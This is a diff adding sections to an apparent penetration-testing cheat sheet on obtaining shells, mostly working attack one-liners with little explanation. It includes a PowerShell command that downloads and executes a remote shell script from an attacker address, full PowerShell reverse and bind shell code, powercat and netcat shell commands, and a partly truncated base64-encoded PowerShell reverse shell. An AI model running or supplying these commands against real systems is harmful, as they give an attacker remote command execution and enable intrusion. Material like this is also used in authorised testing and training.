@@ -1,3 +1,41 @@
+## Powershell shells
+
+```
+powershell -c IEX(new-object net.webclient).downloadstring('http://10.10.xx.xxx:8000/Invoke-PowerShellTcp.ps1')"
+```
+
+```
+// reverse shell
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+// bind shell
+powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
+```
+
+## Powercat shell
+
+```
+// reverse shell
+powercat -c 10.11.0.4 -p 443 -e cmd.exe
+sudo nc -lvp 443
+
+// bind shell
+powercat -l -p 443 -e cmd.exe
+nc 10.11.0.22 443
+```
+
+## Base64 encoded powershell reverse shell
+
+```
+// generate base64 encoded reverse shell command
+powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
+
+// needs to pass the whole
+encoded string to powershell.exe
+powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFM
+AZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHIAYQBt
+```
+
 ## Msfvenom
 
 * Meterpreter
